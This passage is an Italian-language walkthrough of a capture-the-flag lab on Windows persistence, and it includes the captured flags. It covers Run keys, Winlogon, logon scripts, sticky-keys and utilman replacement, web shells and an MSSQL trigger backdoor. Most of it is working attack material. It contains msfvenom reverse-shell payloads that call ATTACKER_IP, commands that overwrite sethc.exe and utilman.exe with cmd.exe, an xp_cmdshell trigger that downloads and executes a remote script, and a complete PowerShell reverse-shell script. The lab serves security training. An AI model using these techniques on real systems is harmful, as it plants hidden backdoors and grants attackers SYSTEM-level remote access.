C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Ora assicurati di uscire dalla sessione dal menu Start (chiudere la finestra RDP non è sufficiente, perché lascia la sessione aperta):

E accedi nuovamente tramite RDP . Dovresti ricevere immediatamente una connessione al computer dell'aggressore.

Utilizza la shell appena ottenuta per eseguire `C:\flags\flag10.exe`e ottenere la tua bandiera!

```
THM{NO_NO_AFTER_YOU}
```

### Esegui / Esegui una volta

È anche possibile forzare un utente a eseguire un programma all'accesso tramite il registro. Invece di inviare il payload in una directory specifica, è possibile utilizzare le seguenti voci di registro per specificare le applicazioni da eseguire all'accesso:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

Le voci di registro sottostanti `HKCU`si applicheranno solo all'utente corrente, mentre quelle sottostanti `HKLM`si applicheranno a tutti. Qualsiasi programma specificato sotto queste `Run`chiavi verrà eseguito ogni volta che l'utente accede. I programmi specificati sotto queste `RunOnce`chiavi verranno eseguiti una sola volta.

Per questo compito, creiamo una nuova shell inversa con msfvenom:

AttackBox

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

Dopo averlo trasferito sul computer della vittima, spostiamolo su `C:\Windows\`:

Prompt dei comandi

```shell-session
C:\> move revshell.exe C:\Windows
```

Creiamo quindi una `REG_EXPAND_SZ`voce di registro in `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. Il nome della voce può essere qualsiasi cosa tu voglia e il valore sarà il comando che vogliamo eseguire.

**Nota:** mentre in una configurazione reale è possibile utilizzare qualsiasi nome per la voce del registro, per questa attività è necessario utilizzare `MyBackdoor` per ricevere il flag.

Dopo aver fatto ciò, esci dalla sessione corrente e accedi nuovamente: dovresti ricevere una shell (ci vorranno probabilmente circa 10-20 secondi).

```
> THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
```

### Winlogon

Un'altra alternativa per avviare automaticamente i programmi all'accesso è l'abuso di Winlogon, il componente di Windows che carica il profilo utente subito dopo l'autenticazione (tra le altre cose).

Winlogon utilizza alcune chiavi di registro `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`che potrebbero essere interessanti per ottenere persistenza :

- `Userinit`punta a `userinit.exe`, che è responsabile del ripristino delle preferenze del tuo profilo utente.
- `shell`punta alla shell del sistema, che di solito è `explorer.exe`.

Se sostituissimo uno qualsiasi degli eseguibili con una reverse shell, interromperemmo la sequenza di accesso, il che non è auspicabile. È interessante notare che è possibile aggiungere comandi separati da una virgola e Winlogon li elaborerà tutti.

Iniziamo creando una shell:

AttackBox

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

Trasferiremo la shell sul computer della vittima come abbiamo fatto in precedenza. Possiamo quindi copiare la shell in qualsiasi directory desideriamo. In questo caso, useremo `C:\Windows`:

Prompt dei comandi

```shell-session
C:\> move revshell.exe C:\Windows
```

Modifichiamo quindi `shell`o `Userinit`in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In questo caso useremo `Userinit`, ma la procedura con `shell`è la stessa.

**Nota:** sebbene sia `shell`e `Userinit`potrebbero essere utilizzati per ottenere la persistenza in uno scenario reale, per ottenere la bandiera in questa stanza, sarà necessario utilizzare `Userinit`.

Dopo aver fatto ciò, esci dalla sessione corrente e accedi nuovamente: dovresti ricevere una shell (ci vorranno probabilmente circa 10 secondi).

```
THM{I_INSIST_GO_FIRST}
```

### Script di accesso

Una delle cose `userinit.exe`che fa durante il caricamento del profilo utente è controllare una variabile d'ambiente chiamata `UserInitMprLogonScript`. Possiamo usare questa variabile d'ambiente per assegnare uno script di accesso a un utente, che verrà eseguito quando accede al computer. La variabile non è impostata di default, quindi possiamo semplicemente crearla e assegnargli qualsiasi script desideriamo.

Tieni presente che ogni utente ha le proprie variabili di ambiente; pertanto, dovrai eseguire il backdoor per ciascuna di esse separatamente.

Per prima cosa creiamo una shell inversa da utilizzare per questa tecnica:

AttackBox

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.99.134 LPORT=4453 -f exe -o revshell.exe
```
Trasferiremo la shell sul computer della vittima come abbiamo fatto in precedenza. Possiamo quindi copiare la shell in qualsiasi directory desideriamo. In questo caso, useremo `C:\Windows`:

Prompt dei comandi

```shell-session
move revshell.exe C:\Windows
```

Per creare una variabile d'ambiente per un utente, è possibile accedervi `HKCU\Environment`nel registro. Useremo la `UserInitMprLogonScript`voce per puntare al nostro payload, in modo che venga caricato quando l'utente effettua l'accesso:

Si noti che questa chiave di registro non ha equivalenti in `HKLM`, pertanto la backdoor si applica solo all'utente corrente.

Dopo aver fatto ciò, esci dalla sessione corrente e accedi nuovamente: dovresti ricevere una shell (ci vorranno probabilmente circa 10 secondi).

```
THM{USER_TRIGGERED_PERSISTENCE_FTW}
```

## Backdooring della schermata di accesso / RDP

Se abbiamo accesso fisico alla macchina (o RDP nel nostro caso), è possibile utilizzare un backdoor nella schermata di accesso per accedere a un terminale senza disporre di credenziali valide per una macchina.

A tal fine esamineremo due metodi che si basano sulle funzionalità di accessibilità.

Tasti permanenti

Quando si premono combinazioni di tasti come `CTRL + ALT + DEL`, è possibile configurare Windows per utilizzare i tasti permanenti, che consentono di premere i pulsanti di una combinazione in sequenza anziché contemporaneamente. In questo senso, se i tasti permanenti sono attivi, è possibile premere e rilasciare `CTRL`, premere e rilasciare `ALT`e infine premere e rilasciare `DEL`per ottenere lo stesso effetto della pressione della  `CTRL + ALT + DEL`combinazione.

Per impostare la persistenza utilizzando i Tasti Permanenti, sfrutteremo una scorciatoia abilitata di default in qualsiasi installazione di Windows che ci consente di attivare i Tasti Permanenti premendo `SHIFT`5 volte. Dopo aver inserito la scorciatoia, dovremmo visualizzare una schermata simile alla seguente:

Dopo aver premuto `SHIFT`5 volte, Windows eseguirà il binario in `C:\Windows\System32\sethc.exe`. Se riusciamo a sostituire tale binario con un payload di nostra preferenza, possiamo quindi attivarlo con la scorciatoia. È interessante notare che possiamo farlo anche dalla schermata di login prima di inserire le credenziali.

Un modo semplice per creare un backdoor nella schermata di login consiste nel sostituirla `sethc.exe` con una copia di `cmd.exe`. In questo modo, possiamo generare una console usando la scorciatoia dei tasti permanenti, anche dalla schermata di login.

Per sovrascrivere `sethc.exe`, dobbiamo prima diventare proprietari del file e concedere al nostro utente attuale l'autorizzazione a modificarlo. Solo allora potremo sostituirlo con una copia di `cmd.exe`. Possiamo farlo con i seguenti comandi:

Prompt dei comandi

```
takeown /f c:\Windows\System32\sethc.exe
```

```
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
```

```
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

```shell-session
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

Dopo averlo fatto, blocca la sessione dal menu di avvio:

Ora dovresti essere in grado di premere `SHIFT`cinque volte per accedere a un terminale con privilegi di SISTEMA direttamente dalla schermata di accesso:

```
C:\flags\flag14.exe
```

```
THM{BREAKING_THROUGH_LOGIN}
```

### Utilman

Utilman è un'applicazione Windows integrata che fornisce opzioni di facile accesso durante la schermata di blocco:

Quando clicchiamo sul pulsante di accesso facilitato nella schermata di login, viene eseguito `C:\Windows\System32\Utilman.exe`con privilegi di SISTEMA. Se lo sostituiamo con una copia di `cmd.exe`, possiamo nuovamente bypassare la schermata di login.

Per sostituire `utilman.exe`, eseguiamo un processo simile a quello che abbiamo fatto con `sethc.exe`:

Prompt dei comandi

```
takeown /f c:\Windows\System32\utilman.exe
```

```
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
```

```
copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

```shell-session
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

Per attivare il nostro terminale, bloccheremo lo schermo dal pulsante di avvio:

Infine, procediamo cliccando sul pulsante "Accessibilità". Poiché abbiamo sostituito `utilman.exe`con una `cmd.exe`copia, otterremo un prompt dei comandi con privilegi di SISTEMA:


```
C:\flags\flag15.exe
```

```
THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}
```

## Persistere attraverso i servizi esistenti

Se non si desidera utilizzare le funzionalità di Windows per nascondere una backdoor, è sempre possibile sfruttare qualsiasi servizio esistente che esegua codice per conto proprio. In questo articolo vedremo come installare backdoor in una tipica configurazione di un server web. Tuttavia, qualsiasi altra applicazione in cui si abbia un certo grado di controllo su ciò che viene eseguito dovrebbe essere in grado di implementare backdoor in modo analogo. Le possibilità sono infinite!

### Utilizzo di Web Shell

Il modo più comune per ottenere la persistenza in un server web è caricare una web shell nella directory web. Questa operazione è banale e ci garantirà l'accesso con i privilegi dell'utente configurato in IIS, che per impostazione predefinita è `iis apppool\defaultapppool`. Anche se si tratta di un utente senza privilegi, ha la speciale `SeImpersonatePrivilege`, che fornisce un modo semplice per raggiungere l'amministratore utilizzando vari exploit noti. Per ulteriori informazioni su come abusare di questo privilegio, consultare la [sezione Windows Privesc Room](https://tryhackme.com/room/windowsprivesc20) .

Iniziamo scaricando una web shell ASP.NET.  [Qui](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx) è disponibile una web shell pronta all'uso , ma sentitevi liberi di usarne una qualsiasi. Trasferitela sul computer della vittima e spostatela nella webroot, che per impostazione predefinita si trova nella `C:\inetpub\wwwroot`directory:

Prompt dei comandi

```shell-session
C:\> move shell.aspx C:\inetpub\wwwroot\
```

**Nota:** a seconda del modo in cui si crea/trasferisce  `shell.aspx`un file, i permessi nel file potrebbero non consentire al server web di accedervi. Se si riceve un errore di "Permesso negato" durante l'accesso all'URL della shell, è sufficiente concedere a tutti i permessi completi sul file per farlo funzionare. È possibile farlo con `icacls shell.aspx /grant Everyone:F`.

Possiamo quindi eseguire comandi dal server web indicando il seguente URL:

`http://10.10.184.102/shell.aspx`

Sebbene le web shell offrano un modo semplice per lasciare una backdoor su un sistema, è consuetudine per i blue team verificare l'integrità dei file nelle directory web. Qualsiasi modifica a un file presente in tali directory attiverà probabilmente un avviso.

```
THM{EZ_WEB_PERSISTENCE}
```

### Utilizzo di MSSQL come backdoor

Esistono diversi modi per installare backdoor nelle installazioni di MSSQL Server. Per ora, esamineremo uno di questi, che sfrutta in modo improprio i trigger. In parole povere, **i trigger** in MSSQL consentono di associare azioni da eseguire quando si verificano eventi specifici nel database. Questi eventi possono variare dall'accesso di un utente all'inserimento, all'aggiornamento o all'eliminazione di dati da una determinata tabella. Per questo compito, creeremo un trigger per qualsiasi INSERT nel `HRDB`database.

Prima di creare il trigger, dobbiamo riconfigurare alcuni elementi sul database. Innanzitutto, dobbiamo abilitare la `xp_cmdshell`stored procedure. `xp_cmdshell`Questa è una stored procedure fornita di default in qualsiasi installazione di MSSQL e consente di eseguire comandi direttamente nella console di sistema, ma è disabilitata per impostazione predefinita.

Per abilitarlo, apriamo `Microsoft SQL Server Management Studio 18`, disponibile dal menu Start. Quando viene richiesta l'autenticazione, basta utilizzare **l'autenticazione di Windows** (valore predefinito) e si accederà con le credenziali del proprio utente Windows corrente. Per impostazione predefinita, l'account Amministratore locale avrà accesso a tutti i database.

Una volta effettuato l'accesso, fare clic sul pulsante **Nuova query** per aprire l'editor di query:

Eseguire le seguenti frasi SQL per abilitare le "Opzioni avanzate" nella configurazione MSSQL e procedere all'abilitazione `xp_cmdshell`.

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

Dopodiché, dobbiamo assicurarci che qualsiasi sito web che accede al database possa essere eseguito `xp_cmdshell`. Per impostazione predefinita, solo gli utenti del database con il `sysadmin`ruolo appropriato potranno farlo. Poiché è previsto che le applicazioni web utilizzino un utente del database con restrizioni, possiamo concedere a tutti gli utenti i privilegi per impersonare l' `sa`utente, che è l'amministratore del database predefinito:

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

Dopo tutto questo, configuriamo finalmente un trigger. Iniziamo modificando il `HRDB`database:

```sql
USE HRDB
```

Il nostro trigger sfrutterà `xp_cmdshell`Powershell per scaricare ed eseguire un `.ps1`file da un server web controllato dall'attaccante. Il trigger sarà configurato per essere eseguito ogni volta che  `INSERT`viene inserito un codice nella `Employees`tabella del `HRDB`database:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Ora che la backdoor è impostata, creiamo `evilscript.ps1`sul computer dell'aggressore una reverse shell di Powershell :

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

Per gestire le connessioni coinvolte in questo exploit, dovremo aprire due terminali:

- Il trigger eseguirà la prima connessione per scaricare ed eseguire `evilscript.ps1`. Il nostro trigger utilizza la porta 8000 per questo.
- La seconda connessione sarà una reverse shell sulla porta 4454 verso la macchina dell'attaccante.

|   |   |   |
|---|---|---|
|AttackBox<br><br>```shell-session<br>user@AttackBox$ python3 -m http.server <br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... <br>```||AttackBox<br><br>```shell-session<br>user@AttackBox$ nc -lvp 4454<br>Listening on 0.0.0.0 4454<br>```|

Con tutto questo pronto, andiamo a `http://10.10.184.102/`inserire un dipendente nell'applicazione web. Poiché l'applicazione web invierà un'istruzione INSERT al database, il nostro TRIGGER ci fornirà l'accesso alla console di sistema.

```
C:\flags\flag17.exe
```

```
THM{xxxxxxxxxxxxxxx}
```

